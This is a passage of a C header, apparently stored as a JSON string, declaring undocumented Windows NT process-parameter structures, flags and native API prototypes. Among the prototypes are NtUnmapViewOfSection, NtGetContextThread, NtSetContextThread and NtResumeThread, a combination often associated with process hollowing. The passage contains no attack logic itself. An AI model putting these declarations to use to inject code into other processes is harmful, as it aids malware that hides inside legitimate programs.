PsAttributeValue(PsAttributeChildProcessPolicy, FALSE, TRUE, FALSE)\n#define PS_ATTRIBUTE_ALL_APPLICATION_PACKAGES_POLICY \\\n    PsAttributeValue(PsAttributeAllApplicationPackagesPolicy, FALSE, TRUE, FALSE)\n#define PS_ATTRIBUTE_WIN32K_FILTER \\\n    PsAttributeValue(PsAttributeWin32kFilter, FALSE, TRUE, FALSE)\n#define PS_ATTRIBUTE_SAFE_OPEN_PROMPT_ORIGIN_CLAIM \\\n    PsAttributeValue(PsAttributeSafeOpenPromptOriginClaim, FALSE, TRUE, FALSE)\n#define PS_ATTRIBUTE_BNO_ISOLATION \\\n    PsAttributeValue(PsAttributeBnoIsolation, FALSE, TRUE, FALSE)\n#define PS_ATTRIBUTE_DESKTOP_APP_POLICY \\\n    PsAttributeValue(PsAttributeDesktopAppPolicy, FALSE, TRUE, FALSE)\n\n#define RTL_MAX_DRIVE_LETTERS 32\n#define RTL_DRIVE_LETTER_VALID (USHORT)0x0001\n\n#define RTL_USER_PROCESS_PARAMETERS_NORMALIZED 0x01\n#define RTL_USER_PROCESS_PARAMETERS_PROFILE_USER 0x02\n\ntypedef struct _RTL_USER_PROCESS_PARAMETERS2\n{\n    ULONG MaximumLength;\n    ULONG Length;\n\n    ULONG Flags;\n    ULONG DebugFlags;\n\n    HANDLE ConsoleHandle;\n    ULONG ConsoleFlags;\n    HANDLE StandardInput;\n    HANDLE StandardOutput;\n    HANDLE StandardError;\n\n    CURDIR CurrentDirectory;\n    UNICODE_STRING DllPath;\n    UNICODE_STRING ImagePathName;\n    UNICODE_STRING CommandLine;\n    PVOID Environment;\n\n    ULONG StartingX;\n    ULONG StartingY;\n    ULONG CountX;\n    ULONG CountY;\n    ULONG CountCharsX;\n    ULONG CountCharsY;\n    ULONG FillAttribute;\n\n    ULONG WindowFlags;\n    ULONG ShowWindowFlags;\n    UNICODE_STRING WindowTitle;\n    UNICODE_STRING DesktopInfo;\n    UNICODE_STRING ShellInfo;\n    UNICODE_STRING RuntimeData;\n    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];\n\n    ULONG_PTR EnvironmentSize;\n    ULONG_PTR EnvironmentVersion;\n    PVOID PackageDependencyData;\n    ULONG ProcessGroupId;\n    ULONG LoaderThreads;\n\n    UNICODE_STRING RedirectionDllName; // REDSTONE4\n    UNICODE_STRING HeapPartitionName; // 19H1\n    ULONG_PTR DefaultThreadpoolCpuSetMasks;\n    ULONG DefaultThreadpoolCpuSetMaskCount;\n} RTL_USER_PROCESS_PARAMETERS2, *PRTL_USER_PROCESS_PARAMETERS2;\n\n#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001\n#define RTL_USER_PROC_PROFILE_USER 0x00000002\n#define RTL_USER_PROC_PROFILE_KERNEL 0x00000004\n#define RTL_USER_PROC_PROFILE_SERVER 0x00000008\n#define RTL_USER_PROC_RESERVE_1MB 0x00000020\n#define RTL_USER_PROC_RESERVE_16MB 0x00000040\n#define RTL_USER_PROC_CASE_SENSITIVE 0x00000080\n#define RTL_USER_PROC_DISABLE_HEAP_DECOMMIT 0x00000100\n#define RTL_USER_PROC_DLL_REDIRECTION_LOCAL 0x00001000\n#define RTL_USER_PROC_APP_MANIFEST_PRESENT 0x00002000\n#define RTL_USER_PROC_IMAGE_KEY_MISSING 0x00004000\n#define RTL_USER_PROC_OPTIN_PROCESS 0x00020000\n\nNTSTATUS NtReadFile(\n    _In_ HANDLE FileHandle,\n    _In_opt_ HANDLE Event,\n    _In_opt_ PVOID ApcRoutine,\n    _In_opt_ PVOID ApcContext,\n    _Out_ PIO_STATUS_BLOCK IoStatusBlock,\n    _Out_ PVOID Buffer,\n    _In_ ULONG Length,\n    _In_opt_ PLARGE_INTEGER ByteOffset,\n    _In_opt_ PULONG Key);\n\nNTSTATUS NtUnmapViewOfSection(\n    _In_ HANDLE ProcessHandle,\n    _In_opt_ PVOID BaseAddress);\n\nNTSTATUS NtGetContextThread(\n    _In_ HANDLE ThreadHandle,\n    _Inout_ PCONTEXT ThreadContext);\n\nNTSTATUS NtSetContextThread(\n    _In_ HANDLE ThreadHandle,\n    _In_ PCONTEXT ThreadContext);\n\nNTSTATUS NtClose(\n    _In_ HANDLE Handle);\n\nNTSTATUS NtResumeThread(\n    _In_ HANDLE ThreadHandle,\n    _Out_opt_ PULONG PreviousSuspendCount);\n\nNTSTATUS NtQueryInformationFile(\n    _In_ HANDLE FileHandle,\n    _Out_ PIO_STATUS_BLOCK IoStatusBlock,\n    _Out_writes_bytes_(Length) PVOID FileInformation,\n    _In_ ULONG Length,\n    _In_ FILE_INFORMATION_CLASS FileInformationClass);\n\nNTSTATUS NtWaitForSingleObject(\n    _In_ HANDLE Handle,\n    _In_ BOOLEAN Alertable,\n    _In_opt_ PLARGE_INTEGER Timeout\n    );\n\nNTSTATUS NtDelayExecution(\n    _In_ BOOLEAN Alertable,\n    _In_opt_ PLARGE_INTEGER DelayInterval\n    );\n#endif"
        }
      ]
    }
  ]
}